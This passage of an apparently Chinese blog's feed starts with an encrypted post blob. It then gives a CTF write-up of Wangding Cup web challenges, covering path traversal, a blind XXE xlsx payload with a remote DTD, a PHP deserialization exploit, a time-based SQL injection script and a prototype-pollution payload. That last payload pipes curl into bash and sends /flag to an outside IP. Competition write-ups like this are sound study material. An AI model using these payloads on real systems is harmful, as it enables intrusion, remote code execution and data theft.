f179cb04f0406d22e7d4cf38dc28a3a8047da12acfc0f7aac151120162e75ae041426a96830c3f8dfce6af1430542179805f00da0352dea00b2860f1b58b7d5907b547974fa21fec8e37de3a1617120c5d3f736bbe29cfda076cb86b405d773311c6c378ac464ddebf3a0ae782a670424ecb0a0460a2f43d396037cb4d820808a3bc76eb4c73a168849df11c9680aa7a186d7ab7d3edb97aafccb29ba2e0f7bf7f0fe843b3220f39ffc5f33c097751af1af54974f6d1801d7465a2496336ba7a27e2210990289f853a498228ff9690696a0f61387d2b19c3fe3c098f94f7a3b6252ac3e7efd8615f53cff7a635125a8254aaa1d2979b51b75e34fbc721c08d8347ac797ae500cee2884b7c2ca07bfce8cdc5afb1db757b8cca6ff1823466c0e48730e7d20806dd6c0fc49d655cae7bf14f6cf8f78217a6a384c57aade5aefc91cfec076e5c02e92a9ccbdec6ec887382a8fc870282740903c5c73081c25897176accec3f14fa87d1cba4dc4be45b167038087ebc82a7d69d4017aa8951518a873348f4f989d9ce661bb131d2f009c08dbaaf5bf4edea2bcb5455a732e57f10951d263d3a6614f01b8c767ef756ae2239c8ccf7adc4c1ae3ac8877c9ac1007ea2cce96bd635c457fd253690dac83bf060fc2b8cb476497ee504aef0ee065279dc0a6132491ec524aebf8538023a66402b0a116b0bbb28fca3986688c40513f809626ef90387f840478e16d40467f71b8f86ecc0501bcd158a3fc6c4fd845b243408a4731f2f66634f64994ee9e560ef0a4466ad766e04c3ff73852cc25c02892cfc297de2578c52b2ae71d20f353d726e9138f6a75f63eb0bf1f760feed5784f1a8978712e77bb616cdcac7cd498f408c0bc851ee274f313e51cbc69c1b12e8fcca959b810953b7c124645a4f8dd119777921135a1dd400c3293282a4d8528fde3e270b9160d7489a36dcf2c703571a5ef4e33dc19e8214695eb69463b7d50051eaed12660a39017a9ba9a3287572331903b7d13fa1813261ec741a3764f615e1e0d636c3a5967b069039211c68c572dac1a59ba86a99bf80a8485ab81519b8ecb2f74f57fcf97646a762f5d684cdb3808942ecf4a3ab74cc13d961fa0558389be59f0bf9bf1bb97ba9e3737261488dc212960471340f7aa20f4b321c587bee2760689820303ca53618068f1f01a82d694049fb13cb799da3d3fb89c4a67c03cc00e58374a52e1d3ee49c5129fae284de51e064744eb71206f547e2fa99ccc3938ac6ab7793abd5a9988f549b02300f7e0d70962f1397e527775d430bf12039b574350ed455abfe1319ef44b6e095acb2fc4d0416ec3b9ff628348079ccc044b2f23f77a277a48b6a33c8df18cd80561b39768ca7a3d8bb23bacf39254a359c66c451fa07dbe09c3b3eee3385b235cfdaa0c278c1e2e76d0fab2c9fff5a8253099e72b2360ee945f620d51b7c47ca8ce3dbe696ecef4070f735c27d5edea8ef698dcd0ff244c696074c5688f45e96002854f72462f0d1e66ceee175b562e9fd0143166fa5740b81be3f759b825ab2ee86dc03ef6553e53bee52639b8b44281e5a08c5b2b8f18850053b84f7167e58e1f3d05ed9c7c88880e313beb31af202519c476ad51dcf5f7fdd33acebaea4e3e243bd10c0869fa9f5c218d82aab279218c29bbb2893241b820472efc031bacc6de544bb91795ae49eef3468dcfac6f8088a059048f1889ae52384fd2883c0944a2ca7012683dfdb49e46fc984a72c81badec7e3b4d0b0b2f8bdaa2d432b00feff0c5b5f3fa05e91d52b54b50aae756c4a3803d28fb8414febe59e1f8b60e8a74a182bb81a3281896500398c0f9b4677f4b284c6a2287d637bebeb1ce04df9d1c1a90f93d227e7017f9508178e593038d202233ca267082b0683c5c48df84fc147f687a40595c7589344c925284bc81787e0217d7c376a160118e0b65b3718a5be70f287d1999c23a40470f6cd87951c2429559c784614a0cb9468cbfa66e22071d493375988ac1f63a1db7cef1629de683d895fbc7e6ae7656dd0711352860125bcb09b12de49aad5ab8a45f8e367ca27a21a8dec4df571ad7cad15f40dffe938c45bef323d25a72992d91fb717482109416e332afd9668dce97353fce45ccf6547a2b95a6942d8fd17a7374b777634a8484c5e7088a04fb677af456d74281362a7dee1c8e4f4a6fe0853384b555d256e6ecf6bf0ce0eb383e4df9adeed5cfcadc29f003eb0a17acf6b9882b0e3414fe04952654cd68c2f9e3ff0ed931c8c68ba3d3d1923734b208990e8e515b5b424c894e0bd4c5e8f552afa532556e3ce63571ba92f5654694fc47a85fd452526fad18fddf6595433d731d085f6be29eae23c1fb37f22b3f01095bbe743aa922d98f31d4ca12f2453b5c47dc1247130d4a1135e227271058343cc9d5a69823faeaa4cdd25499918c08897c93c235c2a6a6ba3379a7c582c816a772457f426fa1d88fedf4a5bb4c5b67a435b156cf3ac92a73aa9f9882fe8a8b7d7615a117ef7e2ce33e16b5c48491b8e7a78203e961cb06df774b6258f61503857efa4d5e404c35687d59d593b1329e91a6971e5728c916f56a53deccc130bb7ea986f9d8b9ad168d37a2fc2dfedfbf81a989c8d69a0334602570284fe2f0febd5815d46613f4fa8a81a06303ac7a19942e0577a3f8af074b0d719dcaf7096e39366d3afd7e2b86d3f83f063cd6a2c219954d03a082f419b8977a9e9fe1f59c3096b4bcdeb28828fcba82ec785ff0483f97908063b5c37614df8d131c52e1c927365b3ce8b15f3953e741a58c65aaffe7b67bc38b13d98ead980e221967a94031b21fde1a54461157bf7d9230a463fd530243fec4b08df9ff0ad9f2776c2747bfedbda9bddc7aa9a9d105fb642ebb7751dc30543f00089f49ee2817fe552f7f56b52a233794c4708e907ac115444634b7edfbead151d14dccacd04c0799df21ff19062954f5d767de5966d8dab767d04264cd0f5153a998161839f2b0e18dec046368c7fafee544468cb59aac9d019ddd37790d8f08d86773e2da4ba0888997151eca663d4550d71079fc9a18efb0a7f42ae2d50d3634ba187e30f657888a1be7def4109ad7bac6cfa58940e06ce34876909ed07b872a0c8a1cfcd1d7321ac908093e682c566d30bfb3fc3de179ee4a1c6a151d67ae3c3bd468d0590c55dc331fefe254c9f08ced6471018d025cb03adfb1a6acb1028681f4c541e44eb65cb62ff12828f343ead1f09b9b8c7255c4728823887493450f94990034e49fb8197945b2110f68986d5c58c5d4f1e1158b0ccc31ff4942370bec213512c9af66fd85a964832fbc7e5a4c6d28e2ec60aeaa92e456406c673816045d926abf4009f391a57df5685d947b9f5276f70b3836bb59f1202404e16fc634cae63f969328f725e96e6627c41ba6e346ce63f9dd6c9dd214edb2c4daaf9880ea34e5f1a7e8443a210144da43cd762a0128f34b90da751b02d5cd888b97f68ed17e5e1c5b5dbcd6e9ab070fbdd4594234bd51b8812fbd8fc4193e09a2b026f5c1603e6fe3c0fa653787265d4f26a6c9df9117115c021f51ca805f6c07f4046ad450eb6f524d10a026b7dfa114607ee4f757f96b431b1eafd723acb702fc6a65cc252a5f8666ca0982675536c61a73547486317c1f3bcf1bea3a8429dbccb7e9d62df2ecdae628eea391f76815339822d7df35eeec906351187ad5e9fb74d25b09fff543bfca12e94f0c20bad75055468d9c5b9d7314962c8135277639f8c8980c309a092b7e9084661c37fc149517bd71e138ed0587c622ed742c4ec87bee8ee1fc6339ecfdf54b6d754e2d865118df1d5893bc9655eaf7d21dc56c33407cbbca8c2f4943e54e0da3a1f3f61071b2dcb8c83e77a5b1af2bfe1f935e18e73521b893a7166280e952d3b266bfe515053e0755aaf59cbe710bd8f72536a4d2d740bad8fb4c5f0785c519fb1d94eb685382d30bbd6c6cb9c288c3e081dd598f7c3510d8c7ec57a5973e31b77d485096edf6fb7eae9c95b04a44a686b0516f599fe0409130e2729e555507fb5934adeaa9d4455dc855919fb7477f9cd68adf5833ebdcbbcf1cd30b4a1b028fb5c5ed5407b8b4775c9b4b9b66ed8c890a94d29d10aa0956260391b3c073908e7be6bfacd057517431f568721fa7f0af8d5d64a17010e34ace57c6672d31602b952f4ddeee669e04ebb2cab383aa41ee183e6da56e3e8ddf2a8b662628142640cb0c94fcdcc2d7cbc2238be400a49a7d8341ebec20748ce215b4010f94c6270fcff102a9639c6dbd4c7803c61271f2049374c6534efa98e9305526243161bc250b18a83815d48dc4469ba643f3d6cd5987a2d96d6626f3353ef5d0c126514c0044b19d515327408bfd4b7b9245be38265ea870aea68f117874d50731b249f6834a0ad3beb8884627df71a6f5ccc81899140520c34c9181c3e35814626fc8d6088fa4d0c4832b6e218f0005356ad8ff2fc804b7f2bbfdb321ae472923641f7ca16fa52897c4a1d4867c716374991527ba32bff2fb2aff2f797312b87b6c985dd77b1e2b737b83ed78281beb6071ca2bc6893c274209a699ae0254f16af26277929e6e25ad293dcc79242895377015388bd93e2e66ada2bddc01df76075b9ce1be8ca20b92f7c7f5c533b8c568848ec3e6f0c1fb5ffe7e82a79468688e33957e9ef9e3f6f8ea2851d619dc73e3a692fb235a6c6770e25bc07c1d336d51a56b0c12ec34e3e2157a2f493f1035a29c6aeab613648942eb0713b31bb63fbce02d020c49bc5eea3d7f4709461478b9f1b10c795f811e82c75ef9c53515ef07773d95a8ee5bef1cdef875e57d21cd9457e988bb1c88780443927b0b34f0f5e0436f700d21bfb3ebe96885cee45b556e44dea03026c39756df93b387f52b933f15286e925d3f4a82275a888548a155a98d11ff47fb86f25116879eb85a717f712a9361d2ffc5660dc4de27e0a699cfc52678611261c316e332eaf9b1e9a6b7da0efb8ea768db01cdf41e4045339d53c4749ec93b3a7f6840bd827983ff6798c411ca82add18b6ad9cd3400a6bfe3c2cd7f76b160a4001c72509e6977a9a5b675d4f651ab558e5b8e5e38e98c27096088b6b7f5abc91aa2e7105327dccbeb062989c2a29305bb680390d2462f2a969ddd257d8ea574ba016e0bb7983a4fdb873e0e7d299780bdb77101b6f9ffd5473182b7469968814a618763808cad42f69d364f1380271c259a4d7f691a7f091ff46ed10bc774cfc1becc0c97c9269c6a3ad3a6e40e472a6b0d8273e598b8e4759f7ea8c8232fab69e8cd44f838c9bcfbcdfc501c846f9ba8874c5cc5c2052089f12e60a3e9a2944388763fcb6ba4ab9b40a83ab5cb51605c429a344382579999a74ca3995bf221a2ee8ffa5541f80366dd8c823895b2c5e184513c110e1e942a138e024a184c660c3bc2ff13361b6560b28649a260e7087b0e0043dc72018c3e0a288ab24987a2a7d5d1145468892f8f62c5f3f369e58e1498e3126f2ba6847d22dd0e37aa135aa47813898a9524003ecba3237488ee6772c445a2671cab70b450fac32eef8d4e7027d8d63456c9dac5c30f5436d3a3858df7c8ec95742966ea8662f780dd7bcc905516f93664664f952e650e18ac3d81ad1c7cb3d95e9b9019b9bd0916ce061af0aa215372e03a42b46b901ca4e0f537a8bebd48345de55575eb2a9bd5581e2c7895a01e3eb4b739285b749343d30091d363a1d61c2550214f4c44975a252ed6f3ae4f9ab884179311b81eb9d544069a7c989e1dd40259c6b7c76cabadf2f03be61ec074f29b3f90081c35326c64bed109823a921467ad5f74e55975c8e3c8f43a647f292973fe52e3d3b2a9713b2989c989f3dbbc112c64e21db24a9b52a109c55c7391a90a7ea13a4192fd1cbb068a015ab339a4ef61ba727fdfcc7b3699ca73b18fd6806af2875a47001b19072f92289407f4423460ac539c4da426649f428187856d81e7ad2cb215a4223ba9ac63373339b056f8f06f3685934734a4745c73085c35912ac93a2bd1a7adc402b8caaa4fe05bdd09143bfe7e1fc28223bf5e540bd7744e1204e91a31cb8fd305fc74e4f85bcfd05bf8393ff39a8291749e6e7e9a85f29e76c5879d83f806f19c93a319c97840920d49a8d6636611d33f4f6c3b7cc6d584bbc2bf71c5c672017490ae62e79de70fb17300e001158686174e5f1f4c8b451cee2191b28f29b87ff1052f58be9ab58bc04af9a2fed922079be135fa2648b1364b9b4da0040454fa02617857110d0ead5af5a4a1995c65dfa5909214ef0e2de0777aa1798a29891e727e50e33c1bbebed0e4c5344911031e8c16344af3d4203a446417e71f590e3cea0735d428f9daf3f7431890427d78a377d9e84130307374fdbc9a0be2cc6dd19c03a8ae65eaa4da1ac3b5fd598cdc094ab84ce45d5de85e781235af36c4f21bdebc38f749ff9640c859f0488018d3ff35fde39e91f61603235bbd1bafeafdbda63360fc13d439d5aa713a101a765d3f200bdeba3367a06e5602a47127352ec3091eb42f942960a9c24531df8993b772235d9534ff190ca8d4fa9d03538a268beb7053c751984d4435e683b59c8a53b44ef694c317d7afe244802944227c2699872d77e73c47bc9f8f57c835788c00676d0d9dceb61354640dbcbedd0858a960ed26d688f35901b7ff2cc3993e7e03999119c560e174a6c8320a5d73c191a5130f1445c842dea0ac63586ef1b397a94de33948a5456d425229caad2974f67ee46cae0af009287b9534273b5bb61b70ca8aa32deb5866621118292532e384732706d22024fc413290c00730544cf7741111e37a86f63af39a422cdc94b9dd6229dd9fd839f4c4329e3a2815754a723a7a5a5c8437292f84aebaa4bd7d71b6f972d420b3fef7896dc435a887e3a5c8348a14ebe922e19c05416fd89365ec2c722154cb7d52e0ab78db724af1b8baeed57a0cf9eea7840cc7b6efb47017168569e5d03af11d5e585d04c9e9f4941c5c00216ba8e577bac7d331ace9e3a6f2100812935320a243720da4f19ea544cd7622f696f38ad6285b394c040fe1519b1568b4ec1257eb85276990a0196ca</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="出题笔记" scheme="http://yoursite.com/categories/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="出题" scheme="http://yoursite.com/tags/%E5%87%BA%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯WEB题解</title>
    <link href="http://yoursite.com/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AFWEB%E9%A2%98%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AFWEB%E9%A2%98%E8%A7%A3/</id>
    <published>2020-05-10T23:52:07.000Z</published>
    <updated>2020-05-11T02:18:43.273Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-前言"><a href="#0x-01-前言" class="headerlink" title="0x 01 前言"></a>0x 01 前言</h3><p>​    老高太强了 ，我躺躺了</p><h3 id="0x-02-filejava"><a href="#0x-02-filejava" class="headerlink" title="0x 02 filejava"></a>0x 02 filejava</h3><ul><li><p>考点</p><p>任意文件读取、CVE-2014-3529</p></li><li><p>解题过程</p></li></ul><ol><li>在文件下载功能进行目录穿越读取相关文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;web.xml</span><br><span class="line">根据xml信息依次读取：</span><br><span class="line">&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;ListFileServlet.class</span><br><span class="line">&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class</span><br><span class="line">&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;DownloadServlet.class</span><br></pre></td></tr></table></figure><p>反编译class文件进行代码审计，在upload里发现关键代码</p><p><img src="/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AFWEB%E9%A2%98%E8%A7%A3/image-20200511080007882.png" alt></p><p>参考这篇文章：<a href="https://xz.aliyun.com/t/6996?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://xz.aliyun.com/t/6996?tdsourcetag=s_pctim_aiomsg</a></p><p>构造盲XXE的xlsx文件进行文件读取</p><p>新建新建execl-1.xlsx文件，修改后缀名execl-1.xlsx.zip解压，然后在[Content_Types].xml添加payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;yes&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><p>重新打包成<code>excel-1.xlsx</code>，注意文件名一定不能错，我就这样被坑掉了。</p><p>在服务器上新建一个<code>evil.etd</code>文件，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;xxxxx:9999&#x2F;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>nc监听，上传文件触发payload，收到flag</p><h3 id="0x-02-AreUSerialz"><a href="#0x-02-AreUSerialz" class="headerlink" title="0x 02 AreUSerialz"></a>0x 02 AreUSerialz</h3><ul><li><p>考点</p><p>php反序列化bypass</p></li><li><p>解题过程</p></li></ul><p>序列化的字符串需要绕过<code>is_valid()</code>函数，因为<code>protected</code>类型的属性的序列化字符串包含不可见字符<code>\00</code>，会被<code>is_valid()</code>函数给ban掉，预期解法应该是是利用S来代替s，在这种情况下<code>\00</code>就会被解析成<code>%00</code>(1个字符)，而如果是小写s，<code>\00</code>就是一个斜线+2个零(3个字符)，在MRCTF中考到了这个考点。</p><p>另外反序列化的时候首先进入的是析构函数，会判断op属性的值如果不是“2”，如果是的话修改成“1”</p><p>但是在<code>process()</code>方法内有进行了判断<code>if ($this-&gt;op == &quot;2&quot;)</code>，两处存在差异可以使用弱类型比较绕过。文件读取需要使用相对路径一直打不通，需要使用绝对路径，首先读取/proc/self/cmdline</p><p>或者/etc/apache2/httpd.conf得到web根目录为/web/html,然后读取flag文件，最终exp为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    protected $op;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;op &#x3D; 2;</span><br><span class="line">        $this-&gt;filename &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;web&#x2F;html&#x2F;flag.php&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo serialize(new FileHandler());</span><br></pre></td></tr></table></figure><p>payload修改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:62:&quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;web&#x2F;html&#x2F;flag.php&quot;;S:10:&quot;\00*\00content&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>非预期解法是利用php版本特性：php7.1+版本对属性类型不敏感，所以修改属性类型为public即可</p><p>补充：</p><p>相对路径的锅，之前D3CTF也有遇到，一直不知道原因，看了颖奇师傅的博客才懂了：<code>如果反序列化字符串没有异常就往前穿越到了根目录</code>，下面是照搬的笔记</p><p>为啥会穿越目录？这是析构方法的锅，请看官方Note：</p><blockquote><p><a href="https://www.php.net/manual/zh/language.oop5.decon.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.decon.php</a></p><p>析构函数在脚本关闭时调用，此时所有的HTTP头信息已经发出。 脚本关闭时的工作目录有可能和在SAPI(如apache)中时不一样。 </p></blockquote><p>这种问题在开发中也出现，请参考<a href="https://www.cnblogs.com/thors/p/9559095.html" target="_blank" rel="noopener">这篇文章</a>给出的解决办法：</p><blockquote><p>1、在__destruct 中使用绝对路径操作文件</p><p>2、__destruct 之前比如构造函数内，先获取 getcwd() 工作目录，然后在 __destruct 中使用 chdir($StrPath)  重新设定工作目录。</p></blockquote><p>使用相对路径的时候：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res &#x3D; file_get_contents($this-&gt;filename);</span><br></pre></td></tr></table></figure><p>会失败并且返回false，所以直接读取是不可以的；但是只要修改一下序列化字符串，比如删掉个符号，改错长度等等，这个<code>file_get_contents()</code>便不再返回false(绝对路径也不返回false)，也就能成功进行读取了</p><p>膜颖奇师傅,tql</p><h3 id="0x-03-trace"><a href="#0x-03-trace" class="headerlink" title="0x 03 trace"></a>0x 03 trace</h3><ul><li><p>考点</p><p>insert注入</p></li><li><p>解题过程</p></li></ul><p>存在insert注入，利用逻辑运算符和溢出报错来进行注入，这里用 pow(9999,100) ，这个表达式的值在 MYSQL 中已经超出 double 范围，会溢出。当我们比较结果为假时，就会执行到溢出语句，返回结果为 数据库操作失败 ；当我们比较结果为真时，执行sleep函数最终payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python2</span><br><span class="line"># coding&#x3D;utf-8</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">s &#x3D; requests.session()</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;43130fb576a44b6ba6d28e970fa02838061bf0e828f446dd.cloudgame1.ichunqiu.com&#x2F;register_do.php&quot;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1, 100):</span><br><span class="line">    for j in range(33, 127):</span><br><span class="line">        param &#x3D; &quot;2&#39;^if(ascii(substr((select &#96;2&#96; from (select 1,2 union select * from flag)a limit 1,1),&#123;&#125;,1))&#x3D;&#123;&#125;,sleep(3),pow(9999,100)),&#39;1&#39;)#&quot;.format(str(i), str(j))</span><br><span class="line">        # print param</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">            &#39;username&#39;: param,</span><br><span class="line">            &#39;password&#39;: &#39;bb&#39;</span><br><span class="line">        &#125;</span><br><span class="line">        st &#x3D; time.time()</span><br><span class="line">        r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;100)</span><br><span class="line">        if time.time() - st &gt; 2:</span><br><span class="line">            flag +&#x3D; chr(j)</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="0x-04-notes"><a href="#0x-04-notes" class="headerlink" title="0x 04 notes"></a>0x 04 notes</h3><ul><li><p>考点</p><p>原型链污染</p></li><li><p>解题过程</p></li></ul><p>审计代码发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit_note(id, author, raw) &#123;</span><br><span class="line">        undefsafe(this.note_list, id + &#39;.author&#39;, author);</span><br><span class="line">        undefsafe(this.note_list, id + &#39;.raw_note&#39;, raw);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而undefsafe函数存在原型链污染，参考<a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940</a></p><p>在edit_note调用该函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">app.route(&#39;&#x2F;edit_note&#39;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#39;mess&#39;, &#123;message: &quot;please use POST to edit a note&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id &#x3D; req.body.id;</span><br><span class="line">        let author &#x3D; req.body.author;</span><br><span class="line">        let enote &#x3D; req.body.raw;</span><br><span class="line">        if (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(&#39;mess&#39;, &#123;message: &quot;edit note sucess&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#39;mess&#39;, &#123;message: &quot;edit note failed&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>在status路由存在命令执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">app.route(&#39;&#x2F;status&#39;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let commands &#x3D; &#123;</span><br><span class="line">            &quot;script-1&quot;: &quot;uptime&quot;,</span><br><span class="line">            &quot;script-2&quot;: &quot;free -m&quot;</span><br><span class="line">        &#125;;</span><br><span class="line">        for (let index in commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;shell:&#39;&#x2F;bin&#x2F;bash&#39;&#125;, (err, stdout, stderr) &#x3D;&gt; &#123;</span><br><span class="line">                if (err) &#123;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                console.log(&#96;stdout: $&#123;stdout&#125;&#96;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(&#39;OK&#39;);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>通过原型链污染给commands增加父类属性从而命令执行。payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;__proto__.a&amp;author&#x3D;curl http:&#x2F;&#x2F;xxxx&#x2F;shell.txt|bash&amp;raw&#x3D;hello world</span><br></pre></td></tr></table></figure><p>然后访问status触发原型链污染</p><p>颖奇师傅的教的payload。如果不能反弹shell的话外带flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;__proto__.bb&amp;author&#x3D;curl -F &#39;flag&#x3D;@&#x2F;flag&#39; 174.1.58.51:9999&amp;raw&#x3D;a</span><br><span class="line"></span><br><span class="line">内容以符号 @ 开头，其后的字符串将被解析为文件名，curl 命令会从这个文件中读取数据发送</span><br><span class="line">-F&#x2F;--form 模拟表单提交</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-前言&quot;&gt;&lt;a href=&quot;#0x-01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x 01 前言&quot;&gt;&lt;/a&gt;0x 01 前言&lt;/h3&gt;&lt;p&gt;​    老高太强了 ，我躺躺了&lt;/p&gt;
&lt;h3 id=&quot;0x-02-filejava&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="YCTF" scheme="http://yoursite.com/tags/YCTF/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF题解</title>
    <link href="http://yoursite.com/2020/05/02/De1CTF%E9%A2%98%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/05/02/De1CTF%E9%A2%98%E8%A7%A3/</id>
    <published>2020-05-02T01:54:29.000Z</published>
    <updated>2020-05-06T15:58:11.003Z</updated>
    
